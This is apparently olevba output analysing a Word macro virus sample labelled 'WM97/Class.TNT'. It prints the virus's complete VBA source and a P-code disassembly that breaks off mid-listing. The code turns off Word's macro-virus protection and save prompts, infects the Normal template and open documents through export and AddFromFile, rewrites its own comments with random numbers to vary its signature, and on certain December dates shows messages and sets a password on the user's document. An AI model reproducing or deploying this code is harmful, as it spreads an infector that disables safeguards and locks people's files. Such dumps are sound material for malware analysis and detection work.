olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.TNT
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.TNT - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'31301787045041198801961,57798531325255E+2131301787045041198801963130178704504119880196
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: o = 0: r = 0
'33780602025430350876011,45375116736039E+2133780602025430350876013378060202543035087601
Randomize
'564452067242098345379291,18441538712374E+225644520672420983453792956445206724209834537929
On Error GoTo 93
'148293941762399637993213,55851776810167E+211482939417623996379932114829394176239963799321
Options.VirusProtection = Chr(48)
'467822292642189808041,0244410177143E+194678222926421898080446782229264218980804
Options.SaveNormalPrompt = Chr(48)
'40902635536807918091213,30459792277034E+2140902635536807918091214090263553680791809121
Options.ConfirmConversions = Chr(48)
'20529961006156756225001,26397965185757E+2120529961006156756225002052996100615675622500
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'918938596219582014892,01782388469868E+199189385962195820148991893859621958201489
dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'257679545761751665238414,51368302957071E+212576795457617516652384125767954576175166523841
If dt > 0 And rt > 0 Then GoTo 93
'497780721004215450402252,09836994057175E+224977807210042154504022549778072100421545040225
If dt = 0 Then
'55175184003439177380251,89757244763932E+2155175184003439177380255517518400343917738025
    Set tnt = NormalTemplate.VBProject.VBComponents
'60222256093889967292,34262606320103E+1860222256093889967296022225609388996729
    Set hst = ActiveDocument.VBProject.VBComponents
'342483139692326845167,9690523596928E+183424831396923268451634248313969232684516
    If Month(Now()) = 12 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'317773406444252565816891,35135232574344E+223177734064442525658168931777340644425256581689
    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(84) + Chr(78) + Chr(84)
'234396100880231759692,06322891567473E+192343961008802317596923439610088023175969
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "TNT"
'4704040454455007438892,58757217831496E+20470404045445500743889470404045445500743889
    hst.Item(Abs(1)).Name = tnt.Item(Abs(1)).Name
'29960840464107904311293,23290385593748E+2029960840464107904311292996084046410790431129
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version
'53968865344380031631362,05098759393285E+2153968865344380031631365396886534438003163136
End If
'179404593643677937316006,59838849610372E+211794045936436779373160017940459364367793731600
If rt = 0 Then Set tnt = ActiveDocument.VBProject.VBComponents
'10439117584597132757696,23353907078409E+2010439117584597132757691043911758459713275769
tnt.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version
'255459484964051210241,6362489175132E+192554594849640512102425545948496405121024
With tnt.Item(Abs(1)).codemodule
'512569600157229028818,05908204055302E+185125696001572290288151256960015722902881
    For j = Chr(49) To Chr(52)
'426389460642500490024011,06618259267332E+224263894606425004900240142638946064250049002401
    .deletelines Chr(49)
'2315996985611149588812,58224140746395E+19231599698561114958881231599698561114958881
    Next j
'58603210561348262779242,04093169823608E+2158603210561348262779245860321056134826277924
    End With
'747749025739486442255,52950266193156E+197477490257394864422574774902573948644225
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'78405600100298771562,34253634546132E+1878405600100298771567840560010029877156
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 99, "Sub ToolsMarco()"
'332777860842296527668417,64233564853353E+213327778608422965276684133277786084229652766841
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'919017414091122203100491,0313241914961E+229190174140911222031004991901741409112220310049
With tnt.Item(Abs(1)).codemodule
'389261062093877291370411,50927855687819E+223892610620938772913704138926106209387729137041
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'467891508643450187886891,61431361548842E+224678915086434501878868946789150864345018788689
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'272675866413823245689761,04250683095361E+222726758664138232456897627267586641382324568976
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
'829059883562479183513962,05539159540755E+228290598835624791835139682905988356247918351396
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'11691664384214798336002,51135005475367E+2011691664384214798336001169166438421479833600
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'2188476422515215460493,32986765398453E+19218847642251521546049218847642251521546049
    If Month(Now()) = 12 And Day(Now()) = 26 Then .replaceline 87, ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & o * o & r * r * o * o & r * r * o & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'5975135401557899676013,33352610433378E+20597513540155789967601597513540155789967601
    rd1 = Int(Rnd(1) * 40) + 1
'860559826091002349268018,62581511760124E+218605598260910023492680186055982609100234926801
    If rd1 = 39 Then .replaceline 87, ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'5854948091087271486446,36591811284334E+19585494809108727148644585494809108727148644
End With
'4927068095382657995562,6520722449307E+20492706809538265799556492706809538265799556
  With tnt.Item(Abs(1)).codemodule
'2773918224677586930251,87957073416469E+20277391822467758693025277391822467758693025
For j = Chr(50) To tnt.Item(Abs(1)).codemodule.countoflines Step Chr(50)
'94303039744781359027847,36845314567287E+2194303039744781359027849430303974478135902784
    r = Int(Rnd(412835) * 303989) + 8485
'1921328654445524707848,74679256561803E+19192132865444552470784192132865444552470784
    o = Int(Rnd(487958) * 785865) + 2988
'32652081643449917696001,12646994261073E+2132652081643449917696003265208164344991769600
    .replaceline j, Chr(39) & r * r & o * o & r * r * o * o & r * r & o * o & r * r & o * o
'52773116176908780894,79591994864987E+1852773116176908780895277311617690878089
    Next j
'30891364002955487987369,12990552151652E+2030891364002955487987363089136400295548798736
 End With
'137482660095963685180018,19903302487085E+211374826600959636851800113748266009596368518001
93:
'815519383292750761235292,24329910618174E+228155193832927507612352981551938329275076123529
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'874503184005337763600004,6678912636393E+228745031840053377636000087450318400533776360000
End Sub
'46225041212931356164001,35502059482088E+2146225041212931356164004622504121293135616400
Sub ToolsMarco()
'264813783612301974845216,09594668535104E+212648137836123019748452126481378361230197484521
End Sub 'WM97/Class.TNT by Virus :) Smile
'9814270489241926916002,37433619219358E+20981427048924192691600981427048924192691600
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.TNT
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 20270 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0056 "31301787045041198801961,57798531325255E+2131301787045041198801963130178704504119880196"
' Line #2:
' 	Dim 
' 	VarDefn rsx
' 	VarDefn rox
' 	VarDefn xix
' 	VarDefn xxi (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn xxe
' 	VarDefn xex
' 	VarDefn exx
' 	VarDefn exd
' 	VarDefn cxi
' 	VarDefn cix
' 	VarDefn xic
' 	VarDefn eox
' 	VarDefn xoe
' 	VarDefn oxe
' 	VarDefn cii
' 	VarDefn rxe
' 	VarDefn rex
' 	VarDefn exr
' 	VarDefn nix
' 	VarDefn ixn
' 	VarDefn nxi
' 	VarDefn lnr
' 	VarDefn nrl
' 	VarDefn rnl (As String)
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #3:
' 	QuoteRem 0x0000 0x0056 "33780602025430350876011,45375116736039E+2133780602025430350876013378060202543035087601"
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	QuoteRem 0x0000 0x0059 "564452067242098345379291,18441538712374E+225644520672420983453792956445206724209834537929"
' Line #6:
' 	OnError 93 
' Line #7:
' 	QuoteRem 0x0000 0x0059 "148293941762399637993213,55851776810167E+211482939417623996379932114829394176239963799321"
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x004F "467822292642189808041,0244410177143E+194678222926421898080446782229264218980804"
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0056 "40902635536807918091213,30459792277034E+2140902635536807918091214090263553680791809121"
' Line #12:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0056 "20529961006156756225001,26397965185757E+2120529961006156756225002052996100615675622500"
' Line #14:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #15:
' 	QuoteRem 0x0000 0x0050 "918938596219582014892,01782388469868E+199189385962195820148991893859621958201489"
' Line #16:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St dt 
' Line #17:
' 	QuoteRem 0x0000 0x0059 "257679545761751665238414,51368302957071E+212576795457617516652384125767954576175166523841"
' Line #18:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 93 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0059 "497780721004215450402252,09836994057175E+224977807210042154504022549778072100421545040225"
' Line #20:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0056 "55175184003439177380251,89757244763932E+2155175184003439177380255517518400343917738025"
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tnt 
' Line #23:
' 	QuoteRem 0x0000 0x004D "60222256093889967292,34262606320103E+1860222256093889967296022225609388996729"
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #25:
' 	QuoteRem 0x0000 0x004F "342483139692326845167,9690523596928E+183424831396923268451634248313969232684516"
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0059 "317773406444252565816891,35135232574344E+223177734064442525658168931777340644425256581689"
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x0050 "234396100880231759692,06322891567473E+192343961008802317596923439610088023175969"
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "TNT"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0053 "4704040454455007438892,58757217831496E+20470404045445500743889470404045445500743889"
' Line #32:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	QuoteRem 0x0000 0x0056 "29960840464107904311293,23290385593748E+2029960840464107904311292996084046410790431129"
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x0056 "53968865344380031631362,05098759393285E+2153968865344380031631365396886534438003163136"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x0059 "179404593643677937316006,59838849610372E+211794045936436779373160017940459364367793731600"
' Line #38:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tnt 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0056 "10439117584597132757696,23353907078409E+2010439117584597132757691043911758459713275769"
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #41:
' 	QuoteRem 0x0000 0x004F "255459484964051210241,6362489175132E+192554594849640512102425545948496405121024"
' Line #42:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #43:
' 	QuoteRem 0x0000 0x0050 "512569600157229028818,05908204055302E+185125696001572290288151256960015722902881"
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #45:
' 	QuoteRem 0x0000 0x0059 "426389460642500490024011,06618259267332E+224263894606425004900240142638946064250049002401"
' Line #46:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #47:
' 	QuoteRem 0x0000 0x0053 "2315996985611149588812,58224140746395E+19231599698561114958881231599698561114958881"
' Line #48:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	QuoteRem 0x0000 0x0056 "58603210561348262779242,04093169823608E+2158603210561348262779245860321056134826277924"
' Line #50:
' 	EndWith 
' Line #51:
' 	QuoteRem 0x0000 0x0050 "747749025739486442255,52950266193156E+197477490257394864422574774902573948644225"
' Line #52:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #53:
' 	QuoteRem 0x0000 0x004D "78405600100298771562,34253634546132E+1878405600100298771567840560010029877156"
' Line #54:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0063 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #55:
' 	QuoteRem 0x0000 0x0059 "332777860842296527668417,64233564853353E+213327778608422965276684133277786084229652766841"
' Line #56:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	QuoteRem 0x0000 0x0058 "919017414091122203100491,0313241914961E+229190174140911222031004991901741409112220310049"
' Line #58:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #59:
' 	QuoteRem 0x0000 0x0059 "389261062093877291370411,50927855687819E+223892610620938772913704138926106209387729137041"
' Line #60:
' 	LitDI2 0x000B 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0BB6 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0018 
' 	Add 
' 	St rsx 
' 	BoS 0x0000 
' 	LitDI2 0x000F 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x16E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	St rox 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0DD8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0037 
' 	Add 
' 	St xix 
' Line #61:
' 	QuoteRem 0x0000 0x0059 "467891508643450187886891,61431361548842E+224678915086434501878868946789150864345018788689"
' Line #62:
' 	Ld rsx 
' 	ArgsLd Asc 0x0001 
' 	St cii 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St eox 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xoe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St oxe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St lnr 
' Line #63:
' 	QuoteRem 0x0000 0x0059 "272675866413823245689761,04250683095361E+222726758664138232456897627267586641382324568976"
' Line #64:
' 	Ld rox 
' 	ArgsLd Asc 0x0001 
' 	St cix 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St rxe 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0010 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rex 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exr 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0011 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St nrl 
' Line #65:
' 	QuoteRem 0x0000 0x0059 "829059883562479183513962,05539159540755E+228290598835624791835139682905988356247918351396"
' Line #66:
' 	Ld xix 
' 	ArgsLd Asc 0x0001 
' 	St xic 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0009 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nix 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0012 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St ixn 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0008 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nxi 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0021 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rnl 
' Line #67:
' 	QuoteRem 0x0000 0x0056 "11691664384214798336002,51135005475367E+2011691664384214798336001169166438421479833600"
' Line #68:
' 	Ld xxi 
' 	ArgsLd Asc 0x0001 
' 	St cxi 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St xxe 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xex 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0012 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exx 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St exd 
' Line #69:
' 	QuoteRem 0x0000 0x0053 "2188476422515215460493,32986765398453E+19218847642251521546049218847642251521546049"
' Line #70:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	LitStr 0x0095 ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & o * o & r * r * o * o & r * r * o & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #71:
' 	QuoteRem 0x0000 0x0053 "5975135401557899676013,33352610433378E+20597513540155789967601597513540155789967601"
' Line #72:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0028 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rd1 
' Line #73:
' 	QuoteRem 0x0000 0x0059 "860559826091002349268018,62581511760124E+218605598260910023492680186055982609100234926801"
' Line #74:
' 	Ld rd1 
' 	LitDI2 0x0027 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	LitStr 0x00A1 ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #75:
' 	QuoteRem 0x0000 0x0053 "5854948091087271486446,36591811284334E+19585494809108727148644585494809108727148644"
' Line #76:
' 	EndWith 
' Line #77:
' 	QuoteRem 0x0000 0x0052 "4927068095382657995562,6520722449307E+20492706809538265799556492706809538265799556"
' Line #78:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #79:
' 	QuoteRem 0x0000 0x0053 "2773918224677586930251,87957073416469E+20277391822467758693025277391822467758693025"
' Line #80:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #81:
' 	QuoteRem 0x0000 0x0056 "94303039744781359027847,36845314567287E+2194303039744781359027849430303974478135902784"
' Line #82:
' 	LitDI4 0x4CA3 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xA375 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St r 
' Line #83:
' 	QuoteRem 0x0000 0x0053 "1921328654445524707848,74679256561803E+19192132865444552470784192132865444552470784"
' Line #84:
' 	LitDI4 0x7216 0x0007 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xFDC9 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #85:
' 	QuoteRem 0x0000 0x0056 "32652081643449917696001,12646994261073E+2132652081643449917696003265208164344991769600"
' Line #86:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Ld o 
' 	Mul 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #87:
' 	QuoteRem 0x0000 0x004D "52773116176908780894,79591994864987E+1852773116176908780895277311617690878089"
' Line #88:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	QuoteRem 0x0000 0x0056 "30891364002955487987369,12990552151652E+2030891364002955487987363089136400295548798736"
' Line #90:
' 	EndWith 
' Line #91:
' 	QuoteRem 0x0000 0x0059 "137482660095963685180018,19903302487085E+211374826600959636851800113748266009596368518001"
' Line #92:
' 	LineNum 93 
' 	BoS 0x0000 
' Line #93:
' 	QuoteRem 0x0000 0x0059 "815519383292750761235292,24329910618174E+228155193832927507612352981551938329275076123529"
' Line #94:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
